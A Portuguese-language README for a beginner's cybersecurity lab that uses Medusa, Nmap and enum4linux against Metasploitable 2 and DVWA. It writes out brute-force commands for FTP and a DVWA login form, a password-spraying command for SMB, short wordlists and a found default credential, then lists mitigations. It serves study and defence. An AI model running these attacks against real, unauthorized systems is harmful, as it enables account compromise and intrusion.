Cybersecurity Lab – Brute-Force Simulação usando Medusa

Este projeto documenta um laboratório básico de cibersegurança utilizando Kali Linux, Medusa e ambientes vulneráveis como Metasploitable 2 e DVWA. O foco é simular ataques de força bruta, password spraying e automação de tentativas de login, com o objetivo de aprender conceitos essenciais de segurança defensiva.

O conteúdo foi criado com uma abordagem de estudante iniciante em cibersegurança.

1. Objetivos do Projeto

Configurar um ambiente de laboratório controlado com máquinas virtuais vulneráveis.

Executar ataques simulados utilizando a ferramenta Medusa.

Entender como funcionam:

Força bruta em serviços

Ataques em formulários web

Password spraying

Testar wordlists simples, validar acessos e registrar os resultados.

Levantar recomendações de mitigação e boas práticas defensivas.

2. Ambiente Utilizado
2.1. Kali Linux

Versão: Kali Linux 2024.x

Ferramentas principais:

Medusa

Nmap

cURL

2.2. Metasploitable 2

Serviços analisados:

FTP (vsftpd)

SSH

SMB

2.3. DVWA (Opcional)

Usado para testes de brute force em formulário web.

2.4. Rede

VirtualBox: Rede interna (Host-only)

Exemplo de IPs:

Kali: 192.168.56.10

Metasploitable: 192.168.56.20

DVWA: 192.168.56.30

3. Configuração Inicial
3.1. Teste de conectividade
   ping 192.168.56.20
3.2. Identificação de serviços na máquina vulnerável
   nmap -sV 192.168.56.20
4. Teste 1 – Ataque de Força Bruta em FTP
4.1. Wordlist simples de usuários (users.txt)
   root
admin
msfadmin
teste
4.2. Wordlist simples de senhas (senhas.txt)
   123
123456
msfadmin
password
4.3. Ataque com Medusa
   medusa -h 192.168.56.20 -u msfadmin -P senhas.txt -M ftp
4.4. Resultado
   ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin
5. Teste 2 – Força Bruta em Formulário Web (DVWA)
5.1. Testando a página de login
   curl -I http://192.168.56.30/dvwa/login.php
5.2. Wordlist simples para o teste
   admin
user
teste
5.3. Automação com Medusa no formulário web
   medusa -h 192.168.56.30 -U users.txt -P senhas.txt -M web-form \
  -m FORM:"http://192.168.56.30/dvwa/login.php" \
  -m DENY:"Login failed"
6. Teste 3 – Password Spraying em SMB
6.1. Enumeração de usuários
   enum4linux -U 192.168.56.20
6.2. Password spraying com uma senha única
   medusa -h 192.168.56.20 -U users.txt -p 123456 -M smbnt
7. Conclusões

Os testes demonstraram que serviços comuns podem ser comprometidos quando:

Utilizam senhas fracas

Não possuem bloqueio de tentativas

Estão expostos sem monitoramento adequado

O objetivo deste laboratório é aprender como essas técnicas funcionam para melhorar a segurança em ambientes reais.

8. Recomendações de Mitigação

Estabelecer políticas de senhas fortes.

Implementar bloqueio após tentativas consecutivas de falha.

Limitar tentativas por IP.

Adotar autenticação multifator (MFA).

Desativar serviços desnecessários.

Monitorar logs de autenticação e eventos suspeitos.

9. Estrutura do Repositório (sugestão)
10. /
├── README.md
├── wordlists/
│   ├── users.txt
│   └── senhas.txt
├── prints/
│   ├── ftp_result.png
│   ├── dvwa_login.png
│   └── smb_enum.png
└── comandos/
     └── medusa_tests.txt
